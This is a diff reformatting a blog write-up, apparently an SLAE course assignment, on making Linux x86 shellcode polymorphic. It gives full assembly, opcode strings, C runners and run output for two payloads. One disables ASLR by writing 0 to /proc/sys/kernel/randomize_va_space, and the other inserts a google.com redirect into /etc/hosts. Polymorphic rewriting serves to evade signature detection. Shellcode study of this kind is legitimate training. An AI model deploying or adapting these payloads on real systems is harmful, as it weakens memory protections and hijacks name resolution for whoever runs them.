@@ -257,44 +257,46 @@ creat(path, mode)
   
 0000 0011 0000 0001 = 0x0301
 
+</strong></pre>
+
 So, the compiler passes **0x0301** to the **open()** system call. As a result, the following instruction is provided&nbsp;
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 mov cl,0x301
-```
+</pre>
 
 which indicates the second argument of the **open()** system call. Also the **mov dx, 0x2bc** will be changed by adding **0x2a1** into **0x1b** as follows
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original Instructions
 mov dx, 0x2bc
 
 ;Altered instructions
 mov dx,0x2a1
 add dx,0x1b
-```
+</pre>
 
 Continuously, the following instructions will be changed
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 mov al,0x8
 int 0x80
-```
+</pre>
 
 with the instructions below
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ; Altered instructions   
 push 0x5
 pop eax
 int 0x80
-```
+</pre>
 
 The above instructions will push the immediate value **0x5** into the stack, indicating the **open()** system call. Then the **pop eax** instruction will store the immediate **0x5** into the **eax** register and then the **int 0x80** instruction will call the function.
 
 Next, polymorphism will be created for the instructions below implementing the **write()** system call. From the original assembly code the following instructions can be seen
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 mov ebx,eax
 push eax
 mov dx,0x3a30
@@ -304,11 +306,11 @@ xor edx,edx
 inc edx
 mov al,0x4
 int 0x80
-```
+</pre>
 
 The above instructions altered with the following instructions in order to achieve polymorphism
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 mov ebx,eax
 ;Altered Instructions
 push ebx
@@ -319,42 +321,41 @@ mov ecx,esp
 shr edx, 16
 inc edx
 mov al, 0x4
-int 0x80
-```
+</pre>
 
 the above instructions are representing the following system call
 
-```
-sys\_write(fd,"0;",1);
+```c
+sys_write(fd,"0;",1);
 ```
 
 The **mov ebx, eax** instruction assigns the value of file descriptor existing in **eax** register into the **ebx** register. Also, checking at the [Linux Syscall Reference](https://syscalls.kernelgrok.com/), the **ebx** register consists the first argument of the **write()** system call. Afterwards, the instruction **push ebx** pushes the file descriptor into the stack. The second argument of the **write()&nbsp;**system call referenced by the **ecx** register consists the buffer that contains the value to write inside the file. Also, the third argument referenced by the **edx** register consists the size of the buffer where in this case is one(1) byte. The instruction **mov cx, 0x3b30** represents the second argument meaning that the value **0;** will be inserted into the **cx** register containing the size of the buffer. Furthermore, the **0x3a30** hex original value altered into **0x3b30** changing " **:**" to " **;**" which does not negatively affect the execution of the program as it is not interpreted in the execution. Also, the 16bit **cx** &nbsp;register has been chosen instead of **ecx** in order to avoid producing any null bytes. As seen at the instructions above, the buffer that contains the **0** value indicating the non randomisation action of the system memory. Additionally, the **';'** value is irrelevant because the size of the buffer is only one(1) byte long, thus the **0** value will only be taken as valid. After moving the chars **"0;"** inside the second argument of the **write()** function, the instruction **mov ecx, esp** will be provided in order to align the stack pointer at the beginning of the stack. As mentioned before, the final argument contains the value of the size of the buffer which must be **1** , so the altered instructions to achieve this change, first must zero out the lower 16bits from **edx** register. To achieve this, the instruction **shr edx,16** will be used which shifts the **edx** lower 16bits by sixteen positions to the right, thus zeroing out the **edx** register. Then, the **edx** register will be increased by one in order to provide the size of the buffer to the **write()** system call. Following, a common way to call the **write()&nbsp;**system call is by using **mov al, 0x4** instruction which assigns the **0x4** immediate value to the **al** lower byte register. Then the instruction **int 0x80** is called to execute the **write()&nbsp;**system call **.**
 
 According with the **[write(2)](http://man7.org/linux/man-pages/man2/write.2.html)** man page, in order to successfully return from the **write()** system call, it is certainly a good programming practice to use the **fsync()** and **close()** functions. Another good programming practice is to use the [**waitpid(2)**](https://linux.die.net/man/2/waitpid) system call in order to force the system to wait for the child process to finish and then release the resources associated with the child before exiting the execution. In this case the _shellcode_ writer uses the **close()&nbsp;**system call followed by the **waitpid()** system call **.** According with the **[close(2)](http://man7.org/linux/man-pages/man2/close.2.html)** man page, the **close()** system call closes a file descriptor, so that it no longer refers to any file and may be reused. Furthermore, because the **close()** system call does not provide any guarantee that the data has been successfully saved to disk, the **[fsync(2)](http://man7.org/linux/man-pages/man2/fsync.2.html)** system call could be used along with **close()**. In case of using [**exit(3)**](http://man7.org/linux/man-pages/man3/exit.3.html) system call all open streams are flushed and closed. Also the parent process might be notified of the exit status and the child dies immediately. According with the above, **fsync()**, **close()**, and **waitpid()** are providing guarantee that all open files will be closed as well as all the processes wil be terminated after done their work. As mentioned above, the functionality offered by the **exit()** system call shouold be enough, so it could be avoided in order to produce a shorter shellcode.
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 mov al,0x6
 int 0x80
 inc eax
 int 0x80
-```
+</pre>
 
 Then the **waitpid()** and **close()** functions will be changed with the **exit()** system call as shown below
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ; Altered instructions  
 mov al,0x1
 int 0x80
-```
+</pre>
 
 The _final polymorphic_ version of the original _shellcode_ is shown below
 
-```
-global \_start
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+global _start
 
 section .text
 
-\_start:
+_start:
  xor ebx,ebx
  mul ebx
  mov DWORD [esp-0x4],eax
@@ -385,18 +386,18 @@ section .text
  int 0x80
  mov al,0x1
  int 0x80
-```
+</pre>
 
 Now that the writing of the polymorphic _shellcode_ version finished, a test will run in order to check if it works. Following, checking about null bytes using **objdump** as shown below
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@slae:/home/xenofon/Documents/Assignment6# objdump -d polyaslr -M intel
 
 polyaslr: file format elf32-i386
 
 Disassembly of section .text:
 
-08048080 \<\_start\>:
+08048080 <_start>:
  8048080: 31 db xor ebx,ebx
  8048082: f7 e3 mul ebx
  8048084: 89 44 24 fc mov DWORD PTR [esp-0x4],eax
@@ -436,18 +437,18 @@ Disassembly of section .text:
  80480f6: cd 80 int 0x80
  80480f8: b0 01 mov al,0x1
  80480fa: cd 80 int 0x80
-```
+</pre>
 
 From the output above it seems that there are no null bytes around, so using **objdump** the production of the _shellcode_ can be done as follows
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@slae:/home/xenofon/Documents/Assignment6# objdump -d ./polyaslr|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xdb\xf7\xe3\x89\x44\x24\xfc\xc7\x44\x24\xf8\x70\x61\x63\x65\xc7\x44\x24\xf4\x76\x61\x5f\x73\xc7\x44\x24\xf0\x69\x7a\x65\x5f\xc7\x44\x24\xec\x6e\x64\x6f\x6d\xc7\x44\x24\xe8\x6c\x2f\x72\x61\xc7\x44\x24\xe4\x65\x72\x6e\x65\xc7\x44\x24\xe0\x79\x73\x2f\x6b\xc7\x44\x24\xdc\x6f\x63\x2f\x73\xc7\x44\x24\xd8\x2f\x2f\x70\x72\x83\xec\x28\x89\xe3\x66\xb9\x01\x03\x66\xba\xa1\x02\x66\x83\xc2\x1b\xb0\x05\xcd\x80\x89\xc3\x53\x66\xb9\x30\x3b\x66\x51\x89\xe1\xc1\xea\x10\x42\xb0\x04\xcd\x80\xb0\x01\xcd\x80"
-```
+</pre>
 
 Afterwards the produced _shellcode_ will be added into a C program named **sh.c** in order to deliver the execution of the polimorphic shellcode.
 
-```
+```c
 #include 
 #include 
 
@@ -479,23 +480,22 @@ ret();
 
 Compiling and running the above program will change the value inside the **/proc/sys/kernel/randomize\_va\_space** from **two(2)** to **zero(0)**.
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@slae:/home/xenofon/Documents/Assignment6# cat /proc/sys/kernel/randomize\_va\_space
 2
 root@slae:/home/xenofon/Documents/Assignment6# gcc -fno-stack-protector -z execstack -o sh sh.c && ./sh
 Shellcode Length: 124
 root@slae:/home/xenofon/Documents/Assignment6# cat /proc/sys/kernel/randomize\_va\_space
 0
-root@slae:/home/xenofon/Documents/Assignment6#
-```
+</pre>
 
 As previously seen in this article, the length of the new _shellcode_ will be checked in order to be align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original _shellcode_. The calculation below shows that the exercise rule is followed.
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 original shelcode length : 83
 polymorphic version length : 124 
-83 \* 1.5 = 124.5
-```
+83 * 1.5 = 124.5
+</pre>
 
 * * *
 
@@ -505,12 +505,12 @@ The third shellcode to analyse adds a new entry in hosts file pointing google.co
 
 The following output shows the assembly code from the original shellcode.
 
-```
-global \_start
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+global _start
 
 section .text
 
-\_start:
+_start:
 xor ecx, ecx
 mul ecx
 mov al, 0x5
@@ -525,9 +525,9 @@ int 0x80 ;syscall to open file
 xchg eax, ebx
 push 0x4
 pop eax
-jmp short \_load\_data ;jmp-call-pop technique to load the map
+jmp short _load_data ;jmp-call-pop technique to load the map
 
-\_write:
+_write:
  pop ecx
  push 20 ;length of the string, dont forget to modify if changes the map
  pop edx
@@ -542,14 +542,14 @@ pop eax
 
 int 0x80 ;syscall to exit
 
-\_load\_data:
- call \_write
+_load_data:
+ call _write
  google db "127.1.1.1 google.com"
-```
+</pre>
 
 Furthermore, the instructions above can be changed in order to perform polymorphism while altering the coding format without changing the functionality of the program. First, the instructions that represent the **open()** system call will be changed as follows
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original instructions 
 
 xor ecx, ecx
@@ -566,7 +566,7 @@ int 0x80 ;syscall to open file
 xchg eax, ebx
 push 0x4
 pop eax
-jmp short \_load\_data ;jmp-call-pop technique to load the map
+jmp short _load_data ;jmp-call-pop technique to load the map
 
 ;Altered instructions 
 
@@ -585,8 +585,8 @@ add cx, 0x50
 int 0x80 ;syscall to open file
 mov ebx, eax
 xor eax, eax
-jmp short \_ldata ;jmp-call-pop technique to load the map
-```
+jmp short _ldata ;jmp-call-pop technique to load the map
+</pre>
 
 The above instructions have been altered in order to achieve polymorphism. The technique **jmp-pop-call** will still remains the same with changes only in label names. Also, the **mul ecx** replaced with , **cdq** and **xor eax, eax ,** zeroing out the **eax** and **edx** registers accordingly. Additionally, the **push** instruction has been altered using **mov** instruction and the file permissions value **0x401** in hex has been splitted into two values , **0x3b1** and **0x50** instead of one, adding them together using the **add** instruction at the 8bits register **cx**. The **xchg** instruction has been changed to **mov** instruction as the **ebx** will be assigned with the value **0x3** which represents the hosts file descriptor returned from the **open()** system call. The **xchg** used from _shellcode_ writer to reduce the _shellcode_ length as it needs two bytes, against the three bytes that **mov** needs. Also , the _shellcode_ writer uses **push** and **pop** to load the **0x4** immediate value into **eax** register indicating the **write()** system call. The alteration here is that the **push** and **pop** replaced with **mov** and also the location of the instruction moved after the **jmp short** instruction and before the **int 0x80** instruction.
 
@@ -594,10 +594,10 @@ Furthermore, the label **\_load\_data** will be changed with **\_ldata** at **jm
 
 To continue further the write system call instructions will be altered as follows
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original instructions
 
-\_write:
+_write:
 pop ecx
 push 20 
 pop edx
@@ -605,19 +605,19 @@ int 0x80
 
 ;Altered instructions
 
-write\_data: 
+write_data: 
 pop ecx
 mov dl, 0x12
 add dl, 0x3
 mov al, 0x4
 int 0x80
-```
+</pre>
 
 The main alteration here is the **pop** and **push** instructions which altered into **mov.** Also in order to avoid null bytes the **edx** register changed into the lower byte register **dl**. Additionally the **\_write** label has been changed into **write\_data**. Following, the **0x15** hex value which represents the length of the message along with the additional carriage return character has been splitted into two values **0x12** and **0x3** instead of one value, then adding them together using the **add** instruction.
 
 The next instructions to be altered are representing the **close** system call.
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original instructions
 
 push 0x6
@@ -628,13 +628,13 @@ int 0x80 ;syscall to close the file
 
 add al,0x2
 int 0x80 ;syscall to close the file
-```
+</pre>
 
 The above instructions from the original _shellcode_, **pop** and **push** are changed with the **add** instruction. The add instruction adds the **0x2** immediate value with the **0x4** value previously assigned at the lower byte register **al** in order to execute the **close** system call with **int 0x80** instruction.
 
 The next instructions to be altered are representing the **exit** system call.
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original instructions
 
 push 0x1
@@ -647,17 +647,17 @@ int 0x80 ;syscall to exit
 xor eax,eax
 mov al,0x1
 int 0x80 ;syscall to exit
-```
+</pre>
 
 The above instructions from the original _shellcode_, **pop** and **push** are changed with the **xor** and **mov** instructions. The **xor** instruction used to zero out the **eax** register and the **mov** instruction used to assign the immediate value at the lower byte **al** register in order to execute the exit system call with **int 0x80** instruction.
 
 The final instructions exist inside the **\_load\_data** label of the original _shellcode_ and will be altered as follows :
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original instructions
 
-\_load\_data:
-call \_write
+_load_data:
+call _write
 google db "127.1.1.1 google.com"
 
 ;Altered instructions
@@ -665,14 +665,13 @@ google db "127.1.1.1 google.com"
 data:
 call wdata
 message db "127.1.1.1 google.com",0x0A
-```
+</pre>
 
 As said before and shown above, the label **\_load\_data** changed into **\_ldata** and also the label **\_write** changed into **write\_data** at the **call** instruction. Furthermore, the **google** tag changed into **message,** and the carriage return character has been added at the end of the message.
 
 The following output shows the final polymorphic shellcode
-
-```
-; poly\_map.nasm
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+; poly_map.nasm
 ;
 ; Adding a record in /etc/hosts
 ;
@@ -680,11 +679,11 @@ The following output shows the final polymorphic shellcode
 ;
 ; Student ID: SLAE - 1314
 
-global \_start
+global _start
 
 section .text
 
-\_start:
+_start:
  xor ecx, ecx
  xor edx, edx
  xor eax, eax
@@ -700,9 +699,9 @@ section .text
  int 0x80 ;syscall to open file
  mov ebx, eax
  xor eax, eax
- jmp short \_ldata ;jmp-call-pop technique to load the map
+ jmp short _ldata ;jmp-call-pop technique to load the map
 
-write\_data:
+write_data:
  pop ecx
  mov dl,0x12
  add dl,0x3
@@ -716,14 +715,13 @@ write\_data:
  mov al,0x1
  int 0x80 ;syscall to exit
 
-\_ldata:
- call write\_data
+_ldata:
+ call write_data
  message db "127.1.1.1 google.com",0x0A
-```
+</pre>
 
 Proceeding further, the polymorphic _shellcode_ is ready for testing. First, the program will be compiled using the following shell script
-
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:~/Documents/SLAE/Assignment6# cat compile.sh
 #!/bin/bash
 
@@ -736,18 +734,18 @@ root@kali:~/Documents/SLAE/Assignment6# ./compile.sh omap
 [+] Assembling with Nasm ...
 [+] Linking ...
 [+] Done!
-```
+</pre>
 
 Then the opcodes will be checked if null bytes exist using **objdump**
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:~/Documents/SLAE/Assignment6# objdump -d omap -M intel
 
 omap: file format elf32-i386
 
 Disassembly of section .text:
 
-08049000 \<\_start\>:
+08049000 <_start>:
 8049000: 31 c9 xor ecx,ecx
 8049002: 31 c0 xor eax,eax
 8049004: 89 4c 24 fc mov DWORD PTR [esp-0x4],ecx
@@ -793,20 +791,20 @@ Disassembly of section .text:
 804905d: 65 2e 63 6f 6d gs arpl WORD PTR cs:[edi+0x6d],bp
 8049062: 0a .byte 0xa
 8049063: 0d .byte 0xd
-```
+</pre>
 
-As it's shown above, it is all good with the polymorphic _shellcode,_ so it's everything ready to proceed further and run it. Before doing that the _shellcode_ must be produced using **objdump** as follows
+As it's shown above, it is all good with the polymorphic _shellcode,_ so it's everything ready to proceed further and run it. Before doing that the shellcode must be produced using **objdump** as follows
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 root@kali:~/Documents/SLAE/Assignment6# objdump -d ./omap|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xc9\x31\xc0\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x6f\x73\x74\x73\xc7\x44\x24\xf4\x2f\x2f\x2f\x68\xc7\x44\x24\xf0\x2f\x65\x74\x63\x83\xec\x10\x89\xe3\x66\xb9\xb1\x03\x66\x83\xc1\x50\xb0\x05\xcd\x80\x89\xc3\x31\xc0\xeb\x14\x59\xb2\x12\x80\xc2\x02\xb0\x04\xcd\x80\x04\x02\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe7\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x0a\x0d"
-```
+</pre>
 
 Following is the C program file where the polymorphic _shellcode_ will be placed in order to be compiled and run
 
-```
-#include \<stdio.h\>
-#include \<string.h\> 
+```c
+#include <stdio.h>
+#include <string.h> 
 
 unsigned char code[] = \
 "\x31\xc9\x31\xc0\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x6f\x73\x74\x73\xc7\x44\x24\xf4\x
@@ -834,7 +832,7 @@ Shellcode Length: 102
 
 Now that the _shellcode_ executed, the **/etc/hosts** file will be checked to see if the new record has been inserted successfully.
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 127.0.0.1 localhost
 127.0.1.1 kali
 
@@ -844,15 +842,13 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 
 127.1.1.1 google.com
-```
+</pre>
 
 As&nbsp; seen previously in this article, the length of the new _shellcode_ must be checked in order to align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original _shellcode_. The calculation below shows that the exercise rule is followed. point
 
-```
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 original shelcode length : 77
 polymorphic version length : 102 
 77 \* 1.5 = 115.5
-```
-
-<!-- /wp:paragraph -->
+</pre>
 
